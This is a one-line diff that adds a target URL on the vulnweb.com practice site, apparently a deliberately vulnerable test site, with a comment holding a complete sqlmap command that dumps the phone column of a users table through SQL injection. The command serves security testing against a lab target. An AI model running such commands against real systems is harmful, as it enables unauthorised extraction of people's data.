@@ -1,0 +1,1 @@
+http://testphp.vulnweb.com/artists.php?artist=1 (GET)  # /usr/bin/sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C phone --dump
